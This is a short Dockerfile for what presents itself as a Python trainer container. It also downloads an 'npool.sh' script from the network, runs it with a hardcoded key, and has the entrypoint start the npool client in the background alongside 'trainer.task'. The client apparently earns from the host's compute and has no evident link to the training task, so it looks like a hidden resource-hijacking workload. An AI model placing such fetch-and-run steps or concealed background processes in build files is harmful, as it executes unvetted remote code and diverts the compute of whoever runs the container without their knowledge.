FROM python:3.9-slim

# Set working directory
WORKDIR /app

# Install necessary packages
RUN apt update && \
    apt install -y curl wget git procps unzip screen && \
    rm -rf /var/lib/apt/lists/*

# Download and install npool
RUN mkdir -p /app/npool && \
    cd /app/npool && \
    wget -q https://download.npool.io/npool.sh -O npool.sh && \
    chmod +x npool.sh && \
    ./npool.sh wW8xBLMezohupvC7

# Copy your trainer code
COPY trainer /app/trainer

# Set entrypoint: start npool in background, then start Python task
WORKDIR /app
ENTRYPOINT ["bash", "-c", "cd npool/linux-amd64 && ./npool & python -m trainer.task"]
